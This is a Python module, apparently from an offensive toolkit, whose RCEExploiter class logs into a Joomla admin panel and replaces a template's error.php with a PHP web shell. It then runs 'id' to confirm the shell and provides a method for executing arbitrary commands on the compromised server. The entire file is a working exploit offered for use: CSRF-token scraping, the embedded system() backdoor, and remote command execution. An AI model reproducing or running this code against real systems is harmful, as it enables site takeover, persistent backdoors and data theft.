"""Remote Code Execution - Template/Plugin exploitation, webshell deployment."""
import asyncio, re, base64, random
from typing import Optional
import aiohttp
from ..utils.helpers import status, random_ua

class RCEExploiter:
    """RCE via Joomla templates, WordPress themes, plugin uploads."""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.admin_url = f"{self.target}/administrator"
        self.session_cookies = None
        self.shell_path = None

    async def login(self, username: str, password: str) -> bool:
        """Login to Joomla admin."""
        headers = {"User-Agent": random_ua(), "Accept": "text/html"}
        login_url = f"{self.admin_url}/index.php"

        async with aiohttp.ClientSession() as s:
            try:
                resp = await s.get(login_url, headers=headers, timeout=10, ssl=False)
                html = await resp.text()
                cookies = str(resp.cookies)
                token_match = re.search(r'name="([a-f0-9]{32})"', html)
                if not token_match:
                    status("Failed to extract CSRF token", "error")
                    return False
                token = token_match.group(1)

                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Referer"] = login_url
                headers["Cookie"] = cookies

                data = {
                    "username": username, "passwd": password,
                    "option": "com_login", "task": "login",
                    "return": base64.b64encode(b"index.php").decode(),
                    token: "1",
                }

                resp = await s.post(login_url, headers=headers, data=data, timeout=10, ssl=False, allow_redirects=False)

                if resp.status in [301, 302, 303]:
                    self.session_cookies = str(resp.cookies) or cookies
                    status("Login successful!", "success")
                    return True
                elif resp.status == 200:
                    html = await resp.text()
                    if "control-panel" in html.lower():
                        self.session_cookies = str(resp.cookies) or cookies
                        status("Login successful!", "success")
                        return True

            except Exception as e:
                status(f"Login error: {e}", "error")

        status("Login failed", "error")
        return False

    async def exploit_template(self) -> dict:
        """RCE via Joomla template modification."""
        if not self.session_cookies:
            return {"success": False, "error": "Not logged in"}

        headers = {
            "User-Agent": random_ua(),
            "Cookie": self.session_cookies,
            "Referer": f"{self.admin_url}/index.php",
        }

        async with aiohttp.ClientSession() as s:
            # Step 1: Get templates
            templates_url = f"{self.admin_url}/index.php?option=com_templates&view=templates"
            try:
                resp = await s.get(templates_url, headers=headers, timeout=10, ssl=False)
                html = await resp.text()

                # Find template names
                template_matches = re.findall(r'option=com_templates.*?file=([a-zA-Z0-9_-]+)', html)
                if not template_matches:
                    template_matches = ["cassiopeia", "protostar", "beez3"]

                template = template_matches[0]
                status(f"Template: {template}", "info")

                # Step 2: Get editor
                edit_url = f"{self.admin_url}/index.php?option=com_templates&view=template&id={template}&file=error.php"
                resp = await s.get(edit_url, headers=headers, timeout=10, ssl=False)
                edit_html = await resp.text()

                token_match = re.search(r'name="([a-f0-9]{32})"', edit_html)
                if not token_match:
                    return {"success": False, "error": "No edit token"}
                edit_token = token_match.group(1)

                # Step 3: Inject PHP shell
                shell_code = """<?php
defined('_JEXEC') or die;
if(isset($_REQUEST['x'])){
    echo '<pre>';
    system($_REQUEST['x'].' 2>&1');
    echo '</pre>';
    die();
}
include_once JPATH_THEMES.'/'.$this->template.'/index.php';
"""
                data = {"jform[source]": shell_code, "task": "template.apply", edit_token: "1"}
                headers["Content-Type"] = "application/x-www-form-urlencoded"

                save_url = f"{self.admin_url}/index.php?option=com_templates&task=template.apply&id={template}&file=error.php"
                resp = await s.post(save_url, headers=headers, data=data, timeout=10, ssl=False)

                if resp.status in [200, 301, 302, 303]:
                    shell_url = f"{self.target}/templates/{template}/error.php"

                    # Verify
                    test_headers = {"User-Agent": random_ua()}
                    test_resp = await s.get(f"{shell_url}?x=id", headers=test_headers, timeout=10, ssl=False)
                    test_text = await test_resp.text()

                    if "uid=" in test_text or "www-data" in test_text:
                        self.shell_path = shell_url
                        status("RCE CONFIRMED!", "critical")
                        return {
                            "success": True,
                            "shell_url": f"{shell_url}?x=COMMAND",
                            "template": template,
                            "test_output": test_text.strip()[:200],
                        }
                    else:
                        return {"success": True, "shell_url": f"{shell_url}?x=COMMAND", "template": template, "note": "Verification inconclusive"}

            except Exception as e:
                return {"success": False, "error": str(e)}

        return {"success": False, "error": "Unknown error"}

    async def execute_command(self, cmd: str) -> str:
        """Execute command on compromised server."""
        if not self.shell_path:
            return "No shell established"

        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            try:
                url = self.shell_path.replace("COMMAND", cmd)
                resp = await s.get(url, headers=headers, timeout=15, ssl=False)
                return await resp.text()
            except Exception as e:
                return f"Error: {e}"
